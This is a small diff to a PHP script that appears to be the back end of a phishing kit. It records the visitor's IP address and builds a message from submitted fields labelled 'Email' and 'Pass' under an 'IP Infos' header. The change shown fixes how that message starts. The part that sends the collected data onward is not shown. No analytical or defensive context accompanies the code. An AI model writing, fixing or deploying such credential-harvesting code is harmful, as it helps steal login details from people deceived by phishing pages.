@@ -1,7 +1,7 @@
 <?php
 ob_start();
 $zabi = getenv("REMOTE_ADDR");
-$message .= "-------DKK----------\n";
+$message = "-------DKK----------\n";
 $message .= "Email : ".$_POST['zz']."\n";
 $message .= "Pass : ".$_POST['aa']."\n";
 $message .= "----------- IP Infos -------\n";
